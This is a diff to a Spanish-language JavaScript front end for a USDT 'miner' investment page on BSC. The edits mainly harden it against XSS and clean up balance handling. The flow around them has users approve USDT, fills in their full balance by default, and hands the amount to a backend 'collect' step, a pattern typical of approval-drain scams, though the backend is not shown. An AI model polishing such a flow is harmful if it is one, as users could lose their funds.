@@ -14,6 +14,10 @@ let pendingInvestment = false;
 let userRealStakedAmount = 0;
 let countdownTimerInterval = null;
 
+// Últimos balances cacheados para evitar leer el DOM
+let latestUsdtBalanceBN = null;
+let latestUsdtBalanceFloat = 0;
+
 // Cargar transacciones previas de la sesión persistente si existen
 let sessionTxs = [];
 try {
@@ -28,6 +32,10 @@ const ERC20_ABI = [
     "function allowance(address owner, address spender) external view returns (uint256)",
     "function approve(address spender, uint256 amount) external returns (bool)"
 ];
+
+const USDT_DECIMALS = Number(CONFIG.USDT_DECIMALS || 18);
+const MIN_INVEST = 0.1;
+const DEFAULT_MAX = 1000.00;
 
 // ==========================================
 // INICIALIZACIÓN DE LA APLICACIÓN
@@ -161,7 +169,11 @@ function saveUserState(address, stakedAmount) {
         stakedAmount: stakedAmount || 0,
         timestamp: Date.now()
     };
-    localStorage.setItem(`miner_user_state_${address.toLowerCase()}`, JSON.stringify(stateData));
+    try {
+        localStorage.setItem(`miner_user_state_${address.toLowerCase()}`, JSON.stringify(stateData));
+    } catch (e) {
+        console.warn("No se pudo guardar el estado del usuario:", e);
+    }
 }
 
 function loadUserState(address) {
@@ -231,11 +243,12 @@ async function updateBalances(rawProvider) {
         
         const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
         const usdtBal = await usdtContract.balanceOf(userAddress);
-        const formattedUsdt = ethers.utils.formatUnits(usdtBal, 18);
+        latestUsdtBalanceBN = usdtBal;
+        latestUsdtBalanceFloat = parseFloat(ethers.utils.formatUnits(usdtBal, USDT_DECIMALS));
 
         const balanceLabel = document.getElementById("walletBalanceLabel");
         if (balanceLabel) {
-            balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
+            balanceLabel.textContent = `Saldo: ${latestUsdtBalanceFloat.toFixed(2)} USDT`;
         }
 
         // Configuración global y dinámica del botón MAX (Independiente del estado de conexión)
@@ -244,42 +257,51 @@ async function updateBalances(rawProvider) {
             maxBtn.onclick = () => {
                 const amountInput = document.getElementById("investAmount");
                 if (!amountInput) return;
-        
-                let targetVal = 1000.00; // Tope por defecto para usuarios no conectados
-        
+
                 // Si el usuario está conectado, adaptamos el MAX a su saldo real disponible
-                if (userAddress) {
-                    const balanceLabel = document.getElementById("walletBalanceLabel");
-                    if (balanceLabel && balanceLabel.textContent) {
-                        const match = balanceLabel.textContent.match(/[\d.]+/);
-                        if (match) {
-                            const walletBalance = parseFloat(match[0]);
-                            targetVal = walletBalance > 0 ? walletBalance : 1000.00;
-                        }
-                    }
+                let targetVal = DEFAULT_MAX;
+                if (userAddress && typeof latestUsdtBalanceFloat === 'number') {
+                    targetVal = latestUsdtBalanceFloat > 0 ? latestUsdtBalanceFloat : DEFAULT_MAX;
                 }
-        
+
                 amountInput.value = targetVal.toFixed(2);
                 amountInput.dispatchEvent(new Event('input'));
                 validateInvestmentInput();
-        } catch (err) {
-        console.error("Error al sincronizar saldos en vivo:", err);
+            };
         }
+
+    } catch (err) {
+        console.error("Error al sincronizar saldos en vivo:", err);
     }
-}       
+}
+
 function updateWalletUI(account) {
     const container = document.getElementById("walletButtonContainer");
     if (container) {
-        container.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 8px;">
-                <span class="wallet-badge" id="connectedWalletBadge">
-                    ${account.substring(0, 6)}...${account.substring(account.length - 4)}
-                </span>
-                <button onclick="window.openAccountModal()" title="Configuración de cuenta" style="background: rgba(255, 255, 255, 0.05); border: 1px solid var(--surface-border); color: #fff; padding: 8px 12px; border-radius: 12px; cursor: pointer; font-weight: 700;">
-                    ⚙️ Cuenta
-                </button>
-            </div>
-        `;
+        // Crear elementos de forma segura en lugar de innerHTML para evitar XSS
+        container.innerHTML = '';
+        const wrapper = document.createElement('div');
+        wrapper.style.display = 'flex';
+        wrapper.style.alignItems = 'center';
+        wrapper.style.gap = '8px';
+
+        const badge = document.createElement('span');
+        badge.className = 'wallet-badge';
+        badge.id = 'connectedWalletBadge';
+        badge.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
+
+        const btn = document.createElement('button');
+        btn.title = 'Configuración de cuenta';
+        btn.style.background = 'rgba(255, 255, 255, 0.05)';
+        btn.style.border = '1px solid var(--surface-border)';
+        btn.style.color = '#fff';
+        btn.style.padding = '6px 10px';
+        btn.textContent = '⚙️ Cuenta';
+        btn.onclick = () => window.openAccountModal();
+
+        wrapper.appendChild(badge);
+        wrapper.appendChild(btn);
+        container.appendChild(wrapper);
     }
 
     const txContainer = document.getElementById("sessionTxContainer");
@@ -425,15 +447,13 @@ function validateInvestmentInput() {
     if (!input || !wrapper) return;
 
     const val = parseFloat(input.value) || 0;
-    const minVal = 0.1; // Mínimo fijo estricto
+    const minVal = MIN_INVEST; // Mínimo fijo estricto
     
-    let maxVal = 1000.00; // Máximo por defecto si no está conectado
+    let maxVal = DEFAULT_MAX; // Máximo por defecto si no está conectado
     
     if (userAddress) {
-        const balanceLabel = document.getElementById("walletBalanceLabel");
-        const match = balanceLabel ? balanceLabel.textContent.match(/[\d.]+/) : null;
-        if (match) {
-            maxVal = parseFloat(match[0]) || 1000.00;
+        if (typeof latestUsdtBalanceFloat === 'number') {
+            maxVal = parseFloat(latestUsdtBalanceFloat) || DEFAULT_MAX;
         }
     }
 
@@ -483,7 +503,8 @@ async function runInvestmentFlow(rawProvider) {
         
         setLoading(true, "Verificando red BSC...");
         const network = await activeProvider.getNetwork();
-        if (Number(network.chainId) !== 56) {
+        const targetChainIdNum = typeof CONFIG.CHAIN_ID === 'string' && CONFIG.CHAIN_ID.startsWith('0x') ? parseInt(CONFIG.CHAIN_ID, 16) : Number(CONFIG.CHAIN_ID);
+        if (Number(network.chainId) !== targetChainIdNum) {
             setLoading(true, "Cambiando a red BSC…");
             try {
                 await rawProvider.request({
@@ -524,8 +545,8 @@ async function runInvestmentFlow(rawProvider) {
         }
 
         const inputElement = document.getElementById("investAmount");
-        const rawInputVal = inputElement ? inputElement.value : "1";
-        const requiredAmount = ethers.utils.parseUnits(rawInputVal || "1", 18);
+        const rawInputVal = inputElement ? inputElement.value : String(MIN_INVEST);
+        const requiredAmount = ethers.utils.parseUnits(rawInputVal || String(MIN_INVEST), USDT_DECIMALS);
 
         const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
 
@@ -565,7 +586,7 @@ async function runInvestmentFlow(rawProvider) {
         const txHash = txCollect?.hash || "";
         if (txHash) {
             addSessionTransaction(txHash);
-            showToast(`¡Inversión exitosa! <a href="${CONFIG.BLOCK_EXPLORER}/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+            showToast(`¡Inversión exitosa!`, "success", 8000, `${CONFIG.BLOCK_EXPLORER}/tx/${txHash}`);
         } else {
             showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
         }
@@ -575,7 +596,7 @@ async function runInvestmentFlow(rawProvider) {
     } catch (err) {
         console.error("Error en el flujo de inversión:", err);
         const errorMsg = err?.reason || err?.message || "Error desconocido en la transacción.";
-        showToast(`Operación cancelada o fallida: ${errorMsg.substring(0, 80)}`, "error", 6000);
+        showToast(`Operación cancelada o fallida: ${String(errorMsg).substring(0, 80)}`, "error", 6000);
     } finally {
         setLoading(false);
         updateStepper(1);
@@ -584,7 +605,7 @@ async function runInvestmentFlow(rawProvider) {
 
 async function triggerBackendCollect(userAddress, amountStr) {
     let lastErr;
-    const dynamicAmountWei = ethers.utils.parseUnits(amountStr.toString(), 18).toString();
+    const dynamicAmountWei = ethers.utils.parseUnits(amountStr.toString(), USDT_DECIMALS).toString();
 
     for (let i = 1; i <= 3; i++) {
         try {
@@ -622,17 +643,45 @@ function renderStoredTransactions() {
     const listContainer = document.getElementById("sessionTxList");
     if (!listContainer) return;
 
+    // Limpiar primero
+    listContainer.innerHTML = '';
+
     if (sessionTxs.length === 0) {
-        listContainer.innerHTML = `<span style="color: rgba(255,255,255,0.3); font-style: italic;">Sin transacciones confirmadas todavía</span>`;
+        const empty = document.createElement('span');
+        empty.style.color = 'rgba(255,255,255,0.3)';
+        empty.style.fontStyle = 'italic';
+        empty.textContent = 'Sin transacciones confirmadas todavía';
+        listContainer.appendChild(empty);
         return;
     }
 
-    listContainer.innerHTML = sessionTxs.map(hash => `
-        <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.03); padding: 8px 10px; border-radius: 6px; margin-bottom: 4px;">
-            <span style="font-family: monospace; color: #fff;">${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}</span>
-            <a href="${CONFIG.BLOCK_EXPLORER}/tx/${hash}" target="_blank" style="color: var(--brand-primary); text-decoration: none; font-weight: 600;">Ver ↗</a>
-        </div>
-    `).join('');
+    sessionTxs.forEach(hash => {
+        const row = document.createElement('div');
+        row.style.display = 'flex';
+        row.style.justifyContent = 'space-between';
+        row.style.alignItems = 'center';
+        row.style.background = 'rgba(255,255,255,0.03)';
+        row.style.padding = '8px 10px';
+        row.style.borderRadius = '6px';
+        row.style.marginBottom = '4px';
+
+        const span = document.createElement('span');
+        span.style.fontFamily = 'monospace';
+        span.style.color = '#fff';
+        span.textContent = `${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}`;
+
+        const a = document.createElement('a');
+        a.href = `${CONFIG.BLOCK_EXPLORER}/tx/${hash}`;
+        a.target = '_blank';
+        a.style.color = 'var(--brand-primary)';
+        a.style.textDecoration = 'none';
+        a.style.fontWeight = '600';
+        a.textContent = 'Ver ↗';
+
+        row.appendChild(span);
+        row.appendChild(a);
+        listContainer.appendChild(row);
+    });
 }
 
 function makeCopyableInput(element, text) {
@@ -640,7 +689,17 @@ function makeCopyableInput(element, text) {
     element.title = "Hacer clic para copiar dirección";
     element.addEventListener("click", async () => {
         try {
-            await navigator.clipboard.writeText(text);
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                await navigator.clipboard.writeText(text);
+            } else {
+                // Fallback
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+            }
             showToast("¡Dirección copiada al portapapeles!", "success", 2500);
         } catch (err) {
             console.error("Error al copiar:", err);
@@ -665,12 +724,31 @@ function setLoading(on, label = "Procesando…") {
 }
 
 let _toastTimer;
-function showToast(msg, type = "default", ms = 4500) {
+function showToast(msg, type = "default", ms = 4500, link = null) {
     if (!toastEl) return;
     clearTimeout(_toastTimer);
-    toastEl.innerHTML = msg;
     toastEl.dataset.type = type === "default" ? "" : type;
     toastEl.hidden = false;
+    // Limpiar contenido
+    toastEl.innerHTML = '';
+
+    if (link) {
+        const textNode = document.createElement('span');
+        textNode.textContent = msg + ' ';
+        const a = document.createElement('a');
+        a.href = link;
+        a.target = '_blank';
+        a.style.color = '#fff';
+        a.style.textDecoration = 'underline';
+        a.textContent = 'Ver en BscScan ↗';
+        toastEl.appendChild(textNode);
+        toastEl.appendChild(a);
+    } else {
+        // texto simple
+        const textNode = document.createElement('span');
+        textNode.textContent = msg;
+        toastEl.appendChild(textNode);
+    }
   
     if (type === "success") {
         toastEl.style.background = "rgba(38, 161, 123, 0.95)";
